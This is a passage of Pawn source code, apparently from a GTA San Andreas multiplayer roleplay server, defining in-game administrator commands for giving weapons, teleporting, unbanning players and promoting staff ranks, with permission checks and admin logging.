    		SendClientMessage(playerid, COLOR_GRAD2, "40: Detonator 41: Spraycan 42: Fire Extinguisher 43: Camera 44: Nightvision Goggles 45: Infared Goggles 46: Parachute");
    		SendClientMessage(playerid, COLOR_LIGHTLGREEN, "_______________________________________");
    		return 1;
    	}
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(gunid < 0 || gunid > 46 || gunid == 19 || gunid == 20 || gunid == 21) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid weapon id.");
    	GiveZamoraWeapon(user, gunid, ammo);
    	format(string, sizeof(string), "AdminWarning: %s has been given a %s with %d ammo by %s",GetName(user), RWN(gunid), ammo, GetName(playerid));
     	SendAdminMessage(COLOR_ADMWARN, string);
    	format(string, sizeof(string), " Administrator %s has given you a %s with %d ammo.", GetName(playerid), RWN(gunid), ammo);
    	SendClientMessage(user, COLOR_WHITE, string);
    	return 1;
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
IRP:giverangegun(playerid, var[])
{
    new gunid, ammo, Float:distance, string[128];
    if(!Logged(playerid)) return NoLogin(playerid);
    if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
    if(sscanf(var, "iif", gunid, ammo, distance))
    {
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /giverangegun [gunid] [ammo] [distance]");
        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
        SendClientMessage(playerid, COLOR_GRAD2, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana 9: Chainsaw");
        SendClientMessage(playerid, COLOR_GRAD2, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers 15: Cane 16: Frag Grenade");
        SendClientMessage(playerid, COLOR_GRAD2, "17: Tear Gas 18: Molotov Cocktail 19: Vehicle Missile 20: Hydra Flare 21: Jetpack 22: 9mm 23: Silenced 9mm 24: Desert Eagle 25: Shotgun");
        SendClientMessage(playerid, COLOR_GRAD2, "26: Sawnoff Shotgun 27: SPAS-12 28: Micro SMG (Mac 10) 29: SMG (MP5) 30: AK-47 31: M4 32: Tec9 33: Rifle");
        SendClientMessage(playerid, COLOR_GRAD2, "25: Shotgun 34: Sniper Rifle 35: Rocket Launcher 36: HS Rocket Launcher 37: Flamethrower 38: Minigun 39: Satchel Charge");
        SendClientMessage(playerid, COLOR_GRAD2, "40: Detonator 41: Spraycan 42: Fire Extinguisher 43: Camera 44: Nightvision Goggles 45: Infared Goggles 46: Parachute");
        SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");

        return 1;
    }
    if(gunid < 0 || gunid > 46 || gunid == 19 || gunid == 20 || gunid == 21) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid weapon id.");
    new Float:pos[3];
    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
    for(new i=0; i != MAX_PLAYERS; i++) {
        if(Logged(i) && IsPlayerInRangeOfPoint(i,distance, pos[0], pos[1], pos[2])) {
            GiveZamoraWeapon(i,gunid,ammo);
        }
    }
    format(string, sizeof(string), "%s has given everyone online a {01A9DB}%s{FF6347} with %d ammo with %f range from his position.", GetName(playerid), RWN(gunid), ammo, distance);
    SendClientMessageToAll(COLOR_LIGHTRED, string);
    return 1;
}
IRP:givegunall(playerid, var[])
{
	new gunid, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 1337) return NoAuth(playerid);
	if(sscanf(var, "i", gunid))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givegunall [gunid]");
		SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
		SendClientMessage(playerid, COLOR_GRAD2, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana 9: Chainsaw");
		SendClientMessage(playerid, COLOR_GRAD2, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers 15: Cane 16: Frag Grenade");
		SendClientMessage(playerid, COLOR_GRAD2, "17: Tear Gas 18: Molotov Cocktail 19: Vehicle Missile 20: Hydra Flare 21: Jetpack 22: 9mm 23: Silenced 9mm 24: Desert Eagle 25: Shotgun");
		SendClientMessage(playerid, COLOR_GRAD2, "26: Sawnoff Shotgun 27: SPAS-12 28: Micro SMG (Mac 10) 29: SMG (MP5) 30: AK-47 31: M4 32: Tec9 33: Rifle");
		SendClientMessage(playerid, COLOR_GRAD2, "25: Shotgun 34: Sniper Rifle 35: Rocket Launcher 36: HS Rocket Launcher 37: Flamethrower 38: Minigun 39: Satchel Charge");
		SendClientMessage(playerid, COLOR_GRAD2, "40: Detonator 41: Spraycan 42: Fire Extinguisher 43: Camera 44: Nightvision Goggles 45: Infared Goggles 46: Parachute");
		SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
		return 1;
	}
	if(gunid < 0 || gunid > 46 || gunid == 19 || gunid == 20 || gunid == 21) return SendClientMessage(playerid, COLOR_GRAD2, "Invalid weapon id.");
	foreach(Player, i)
	{
	    if(Logged(i))
	    {
		    GiveZamoraWeapon(i, gunid, 230);
	    }
	}
	format(string, sizeof(string), "AdmCmd: %s has given a {01A9DB}%s{FF6347} to everyone online.", GetName(playerid), RWN(gunid));
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	return 1;
}
IRP:disarm(playerid, var[])
{
    new user, string[128];
	if(!Logged(playerid)) NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /disarm [playerid]");
        if(!Logged(user)) return NoLoginB(playerid);
        if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "Player has a higher admin level than you.");
        format(string, sizeof(string), "AdminWarning: %s has been disarmed by %s",GetName(user), GetName(playerid));
     	SendAdminMessage(COLOR_ADMWARN, string);
    	format(string, sizeof(string), "Administrator %s has removed your weapons.", GetName(playerid));
    	SendClientMessage(user, COLOR_WHITE, string);
    	ResetZamoraWeapons(user);
    }
    else
    {
		NoAuth(playerid);
	}
	return 1;
}

IRP:explode(playerid, var[])
{
	new string[128], Float:Pos[3], user;
	if(!Logged(playerid)) NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
		if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /explode [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
  	    if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "Player has a higher admin level than you.");
  	    GetPlayerPos(user, Pos[0], Pos[1], Pos[2]);
  	    CreateExplosion(Pos[0], Pos[1], Pos[2], 6, 10);
  	    format(string, sizeof(string), "AdminWarning: %s has set up an explosion on %s", GetName(playerid), GetName(user));
  	    SendAdminMessage(COLOR_ADMWARN, string);
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:gotopos(playerid, var[])
{
    new Float:Pos[3], int;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] < 4) return NoAuth(playerid);
	if(sscanf(var, "fffi", Pos[0], Pos[1], Pos[2], int)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotopos [x] [y] [z] [int]");
	SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	SetPlayerInterior(playerid, int);
	return 1;
}
IRP:goto(playerid, var[])
{
	new user, string[128];
	new Float:Pos[3];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pHelper] >= 3 || Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /goto [playerid]");
    	if(!Logged(user) && !IsPlayerNPC(user)) return NoLoginB(playerid);
    	if(Player[playerid][pHelper] && !Player[playerid][pAdmin] && !Player[playerid][pStaffObserver])
    	{
    	    if(!HelpTime[user]) return SendClientMessage(playerid, COLOR_GRAD2, "This player didn't request a help.");
    	   	if(hPos[playerid][0] == 0 && hPos[playerid][1] == 0 && hPos[playerid][2] == 0 && hPOS[playerid][0] == 0 && hPOS[playerid][0] == 0)
    	   	{
    		    GetPlayerPos(playerid, hPos[playerid][0], hPos[playerid][1], hPos[playerid][2]);
    		    hPOS[playerid][0] = GetPlayerInterior(playerid);
      		    hPOS[playerid][1] = GetPlayerVirtualWorld(playerid);
	    		GetPlayerPos(user, Pos[0], Pos[1], Pos[2]);
	    		SetPlayerPos(playerid, Pos[0]+1, Pos[1], Pos[2]);
	    		SetPlayerInterior(playerid, GetPlayerInterior(user));
	    		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(user));
		    	format(string, sizeof(string), "* You have teleported to %s.", GetName(user));
		    	SendClientMessage(playerid, COLOR_WHITE, string);
		    	format(string, sizeof(string), "* %s have teleported to you.", GetName(playerid));
		    	SendClientMessage(user, COLOR_WHITE, string);
	    		format(string, sizeof(string), "HelperWarning %s has teleported to %s.", GetName(playerid), GetName(user));
		    	SendHelperMessage(COLOR_ADMWARN, string);
    		}
	    	else SendClientMessage(playerid, COLOR_GRAD2, "You are not able to do that, Use /goback first.");
    	}
    	else
    	{
    		if(Spec[user]) return SendClientMessage(playerid, COLOR_GRAD2, "The player you are trying to teleport to is currently spectating someone.");
	    	GetPlayerPos(user, Pos[0], Pos[1], Pos[2]);
	     	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    	{
	    	    SetVehiclePos(GetPlayerVehicleID(playerid), Pos[0]+2, Pos[1]+2, Pos[2]);
	    	}
	    	else
	    	{
	    	    SetPlayerPos(playerid, Pos[0]+1, Pos[1], Pos[2]);
	    	}
    		SetPlayerInterior(playerid, GetPlayerInterior(user));
	    	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(user));
	    	format(string, sizeof(string), "* You have teleported to %s.", GetName(user));
	    	SendClientMessage(playerid, COLOR_WHITE, string);
	    	if(strlen(Player[playerid][pSName]))
	    	{
	        	format(string, sizeof(string), "* %s have teleported to you.", Player[playerid][pSName]);
	        	SendClientMessage(user, COLOR_WHITE, string);
	        }
	        else
	        {
                format(string, sizeof(string), "* %s have teleported to you.", GetName(playerid));
	        	SendClientMessage(user, COLOR_WHITE, string);
	        }
    	}
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:gotocar(playerid, var[])
{
	new vehid, string[128];
	new Float:Pos[3];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2 || Player[playerid][pStaffObserver])
	{
    	if(sscanf(var, "i", vehid)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gotocar [vehicleid]");
    	if(vehid < 0) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid vehicle id.");
    	GetVehiclePos(vehid, Pos[0], Pos[1], Pos[2]);
    	SetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    	format(string, sizeof(string), "* You have teleported to vehicle ID %d.", vehid);
    	SendClientMessage(playerid, COLOR_WHITE, string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}


IRP:gethere(playerid, var[])
{
	new user, string[128];
	new Float:Pos[3];
	if(!Logged(playerid)) return NoLogin(playerid);
    if(Player[playerid][pAdmin] >= 3)
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /gethere [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(Player[playerid][pAdmin] < Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do any action against this player.");
        if(Spec[user]) return SendClientMessage(playerid, COLOR_GRAD2, "The player you are trying to get him teleported is currently spectating someone.");
    	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
    	if(IsPlayerInAnyVehicle(user) && GetPlayerState(user) == PLAYER_STATE_DRIVER && !GetPlayerInterior(playerid))
    	{
        	SetVehiclePos(GetPlayerVehicleID(user), Pos[0]+2, Pos[1]+2, Pos[2]);
    	}
    	else
    	{
    	    SetPlayerPos(user, Pos[0]+1, Pos[1], Pos[2]);
    	}
    	SetPlayerInterior(user, GetPlayerInterior(playerid));
    	SetPlayerVirtualWorld(user, GetPlayerVirtualWorld(playerid));
    	format(string, sizeof(string), "* You have teleported %s to you.", GetName(user));
    	SendClientMessage(playerid, COLOR_WHITE, string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}


IRP:unban(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	new string[128], user[32];
    	if(sscanf(var, "s[32]", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /unban [name]");
    	new file[64], IP[16], file2[64], IP2[16];
    	format(file, sizeof(file), "Accounts/%s.ini", user);
    	if(dini_Exists(file))
    	{
            format(IP, sizeof(IP), "%s", dini_Get(file, "IP"));
    	    format(file2, sizeof(file2), "Bans/%s.ini", user);
    	    format(IP2, sizeof(IP2), "Bans/%s.ini", IP);
    	    if(dini_Exists(file2))
			{
			    dini_Remove(file2);
			    dini_Remove(IP2);
			}
			else
			{
                SendClientMessage(playerid, COLOR_GRAD2, "Please make sure that the name you've entered is banned.");
            }
	        // Removing from accounts file
    	    dini_IntSet(file, "pBanned", 0);
    	    dini_IntSet(file, "Warns", 0);
    	    dini_Set(file, "Warn1", "");
    	    dini_Set(file, "Warn2", "");
    	    dini_Set(file, "Warn3", "");
    	    dini_Set(file, "BanReason", "");
	        dini_Set(file, "BannedBy", "");
    	    format(string, sizeof(string), "AdminWarning: %s has unbanned %s.", GetName(playerid), var);
    		SendAdminMessage(COLOR_ADMWARN,  string);
    		format(string, sizeof(string), "AdminWarning: %s (%s) has unbanned %s (%s).", GetName(playerid), RPIP(playerid), var, IP);
    		Log("Log/Admins/ban.log", string);
    	}
    	else
    	{
	        SendClientMessage(playerid, COLOR_GRAD2, "You've entered an invalid player name.");
    	}
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:unbanip(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 2)
	{
    	new string[128], IP[16], IP2[16];
    	if(sscanf(var, "s[16]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /unbanip [ip]");
    	if(IsValidIP(var)) return SendClientMessage(playerid, COLOR_GRAD2, "You've entered an Invalid IP adress.");
	    format(IP2, sizeof(IP2), "Bans/%s.ini", IP);
	    if(!dini_Exists(IP2)) return SendClientMessage(playerid, COLOR_GRAD2, "Please make sure that the IP you've entered is banned.");
	    // Removing from ban file
	    if(dini_Exists(IP2)) return dini_Remove(IP2);
   		format(string, sizeof(string), "AdminWarning: %s has unbanned IP %s", GetName(playerid), var);
	    SendAdminMessage(COLOR_ADMWARN,  string);
   		format(string, sizeof(string), "AdminWarning: %s (%s) has unbanned IP %s", GetName(playerid), RPIP(playerid), var);
    	Log("Log/Admins/ban.log", string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:makesa(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makesa [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(Player[user][pStaffObserver]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is a Staff Observer already.");
 	    format(string, sizeof(string), "StaffWarning: %s has promoted %s as a Staff Observer.", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "StaffWarning: %s (%s) has promoted %s (%s) as a Staff Observer", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/makesa.log", log);
		Player[user][pStaffObserver] = 1;
		StaffWarn(COLOR_SWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:maketester(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /maketester [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(Player[user][pTester]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is a server tester already.");
 	    format(string, sizeof(string), "AdminWarning: %s has promoted %s as a server tester.", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "AdminWarning: %s (%s) has promoted %s (%s) as a server tester.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/maketester.log", log);
		Player[user][pTester] = 1;
		SendAdminMessage(COLOR_ADMWARN, string);
		SendTesterMessage(COLOR_ADMWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:firetester(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /maketester [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(!Player[user][pTester]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not a Server Tester");
 	    format(string, sizeof(string), "AdminWarning: %s has removed %s from Server Testers.", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "AdminWarning: %s (%s) has removed %s (%s) from Server Testers.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/firetester.log", log);
		Player[user][pTester] = 0;
		SendAdminMessage(COLOR_ADMWARN, string);
		SendTesterMessage(COLOR_ADMWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:firemapper(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /firemapper [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(!Player[user][pMapper]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not a mapper");
 	    format(string, sizeof(string), "AdminWarning: %s has fired %s from the mapping team.", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "AdminWarning: %s (%s) has fired %s (%s) from the mapping team.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/firemapper.log", log);
		Player[user][pMapper] = 0;
		SendAdminMessage(COLOR_ADMWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:makefamed(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makefamed [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(Player[user][pFamed]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is a Famed already.");
 	    format(string, sizeof(string), "AdminWarning: %s has promoted %s as a Famed Player", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "AdminWarning: %s (%s) has promoted %s (%s) as a Famed Player.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/makefamed.log", log);
		Player[user][pFamed] = 1;
		SendAdminMessage(COLOR_ADMWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:removefamed(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /removefamed [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(!Player[user][pMapper]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not a famed");
 	    format(string, sizeof(string), "AdminWarning: %s has removed %s's famed status.", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "AdminWarning: %s (%s) has removed %s (%s) famed status.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/removefamed.log", log);
		Player[user][pFamed] = 0;
		SendAdminMessage(COLOR_ADMWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:makemapper(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 4)
	{
	    new user, string[128], log[128];
	    if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makemapper [playerid]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(Player[user][pMapper]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is a server mapper already.");
 	    format(string, sizeof(string), "AdminWarning: %s has promoted %s as a server mapper.", GetName(playerid), GetName(user));
	   	format(log, sizeof(log), "AdminWarning: %s (%s) has promoted %s (%s) as a server mapper.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user));
		Log("Log/Admins/makemapper.log", log);
		Player[user][pMapper] = 1;
		SendAdminMessage(COLOR_ADMWARN, string);
	}
	else
	{
	    NoAuth(playerid);
	}
	return 1;
}
IRP:sname(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pStaffObserver])
   	{
    	if(sscanf(var, "s[32]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sname [name]");
    	format(Player[playerid][pSName], 32, "%s", var);
    	format(string, sizeof(string), "AdminWarning: %s has given himself a name %s.", GetName(playerid), var);
    	StaffWarn(COLOR_SWARN, string);
	}
    else
    {
		NoAuth(playerid);
	}
	return 1;
}
/*IRP:givetag(playerid, var[])
{
	new user, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pAdmin] >= 1337)
   	{
    	if(sscanf(var, "us[32]", user, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /givetag [playerid] [tag]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	format(Player[user][pTag], 32, "%s", var);
    	format(string, sizeof(string), "AdminWarning: %s has given %s a tag %s.", GetName(playerid), GetName(user), var);
    	SendAdminMessage(COLOR_ADMWARN, string);
	}
    else
    {
		NoAuth(playerid);
	}
	return 1;
}*/
IRP:makehelper(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000 || Player[playerid][pHelper] == 5)
	{
	    new user, admin, string[128], string2[128];
	    if(sscanf(var, "ui", user, admin)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makehelper [playerid] [level]");
		if(!Logged(user)) return NoLoginB(playerid);
		if(admin < 0 || admin > 6) return SendClientMessage(playerid, COLOR_GRAD2, "You're enterting an invalid helper rank. (1-6)");
	    if(Player[user][pHelper] != admin)
	    {
	        new log[256];
		    if(Player[user][pHelper] < admin)
			{
		    	format(string, sizeof(string), "AdminWarning: %s has promoted %s to %s.", GetName(playerid), GetName(user), RHA(admin));
    		    format(string2, sizeof(string2), "HelpWarning: %s has promoted %s to %s.", GetName(playerid), GetName(user), RHA(admin));
            	format(log, sizeof(log), "AdminWarning: %s (%s) has promoted %s (%s) to %s.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user), RHA(admin));
			}
			else if(Player[user][pHelper] > admin)
			{
	  	    	format(string, sizeof(string), "AdminWarning: %s has demoted %s to %s.", GetName(playerid), GetName(user), RHA(admin));
	  	    	format(string2, sizeof(string2), "HelpWarning: %s has demoted %s to %s.", GetName(playerid), GetName(user), RHA(admin));
	  	    	format(log, sizeof(log), "AdminWarning: %s (%s) has demoted %s (%s) to %s.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user), RHA(admin));
			}
			Log("Log/Admins/makehelper.log", log);
			Player[user][pHelper] = admin;
			SendAdminMessage(COLOR_ADMWARN,  string);
			SendHelperMessage(COLOR_ADMWARN, string2);
			if(!Player[user][pHelper])
			{
			    SendClientMessage(user, COLOR_ADMWARN, string2);
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "This player already have the same helper level.");
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:makegangmod(playerid, var[])
{
	new string[128], user, log[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
        if(sscanf(var, "ui", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makegangmod [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(!Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to give the GangMod to non-game administrator.");
    	if(!Player[user][pGangMod])
    	{
    	    Player[user][pGangMod] = 1;
    	    format(string, sizeof(string), "AdminWarning: %s has assigned %s as a Gang Moderator.", GetName(playerid), GetName(user));
    	    format(log, sizeof(log), "AdminWarning: %s has assigned %s as a Gang Moderator.", GetName(playerid), GetName(user));
    	}
    	else
    	{
    	    Player[user][pGangMod] = 0;
    	    format(string, sizeof(string), "AdminWarning: %s has removed %s's Gang Moderator powers.", GetName(playerid), GetName(user));
    	    format(log, sizeof(log), "AdminWarning: %s has removed %s's Gang Moderator powers.", GetName(playerid), GetName(user));
    	}
    	Log("Log/Admins/makeadmins.log", log);
    	SendAdminMessage(COLOR_ADMWARN,  string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:makefacmod(playerid, var[])
{
	new string[128], user, log[256];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
        if(sscanf(var, "ui", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makefacmod [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(!Player[user][pAdmin]) return SendClientMessage(playerid, COLOR_GRAD2, "You're not able to give FacMod to non-game administrator.");
    	if(!Player[user][pFacMod])
    	{
    	    Player[user][pFacMod] = 1;
	        format(string, sizeof(string), "AdminWarning: %s has assigned %s as a Faction Moderator.", GetName(playerid), GetName(user));
    	    format(log, sizeof(log), "AdminWarning: %s has assigned %s as a Faction Moderator.", GetName(playerid), GetName(user));
    	}
    	else
    	{
	        Player[user][pFacMod] = 0;
	        format(string, sizeof(string), "AdminWarning: %s has removed %s's Faction Moderator powers.", GetName(playerid), GetName(user));
    	    format(log, sizeof(log), "AdminWarning: %s has removed %s's Faction Moderator powers.", GetName(playerid), GetName(user));
    	}
    	SendAdminMessage(COLOR_ADMWARN,  string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:makeadmin(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] == 100000)
	{
	    new user, admin, string[128], string1[128];
	    if(sscanf(var, "ui", user, admin)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /makeadmin [playerid] [level]");
		if(!Logged(user)) return NoLoginB(playerid);
	    if(Player[user][pAdmin] != admin)
	    {
	        new log[256];
		    if(Player[user][pAdmin] < admin)
			{
		    	format(string, sizeof(string), "AdminWarning: %s has promoted %s to %s.", GetName(playerid), GetName(user), RMA(admin));
		    	SendAdminMessage(COLOR_ADMWARN, string);
            	format(log, sizeof(log), "AdminWarning: %s (%s) has promoted %s (%s) to %s.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user), RMA(admin));
            	format(string1, sizeof(string1), "AdminWarning: %s has promoted you to %s.", GetName(playerid), RMA(admin));
            	SendClientMessage(user, COLOR_ADMWARN, string1);
			}
			else if(Player[user][pAdmin] > admin)
			{
	  	    	format(string, sizeof(string), "AdminWarning: %s has demoted %s to %s.", GetName(playerid), GetName(user), RMA(admin));
	  	    	SendAdminMessage(COLOR_ADMWARN, string);
	  	    	format(log, sizeof(log), "AdminWarning: %s (%s) has demoted %s (%s) to %s.", GetName(playerid), RPIP(playerid), GetName(user), RPIP(user), RMA(admin));
	  	    	format(string1, sizeof(string1), "AdminWarning: %s has demoted you to %s.", GetName(playerid), RMA(admin));
            	SendClientMessage(user, COLOR_ADMWARN, string1);
			}
			Log("Log/Admins/makeadmins.log", log);
			Player[user][pAdmin] = admin;
			Player[user][pSafeAdmin] = 1;
			if(!Player[user][pAdmin])
			{
			    Player[user][pSafeAdmin] = 0;
			    Player[playerid][pGangMod] = 0;
			    Player[playerid][pFacMod] = 0;
			    Player[playerid][pBanAppealer] = 0;
			}
			new file[32];
			format(file, sizeof(file), "Accounts/%s.ini", GetAccountName(user));
			if(dini_Exists(file))
			{
				dini_IntSet(file, "Admin", Player[user][pAdmin]);
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "This player is already have the same admin level.");
	}
	else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:saveserver(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pAdmin] >= 1337)
	{
        foreach(Player, i)
    	{
    		if(Logged(i))
    		{
    		    SaveChar(i);
    		}
    	}
    	SaveObj();
    	SaveHouses();
    	SaveFactions();
    	SaveFamilies();
    	SaveDoors();
    	SaveGates();
    	SaveMapIcons();
    	SaveDrugs();
    	SaveMOTDS();
    	SaveTUpdates();
    	SavePoints();
    	SaveBusiness();
        new string[128];
    	format(string, sizeof(string), "AdminWarning: %s has saved all server files.", GetName(playerid));
    	SendAdminMessage(COLOR_ADMWARN,  string);
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}

IRP:gmx(playerid, var[])
{
	new string[128], time;
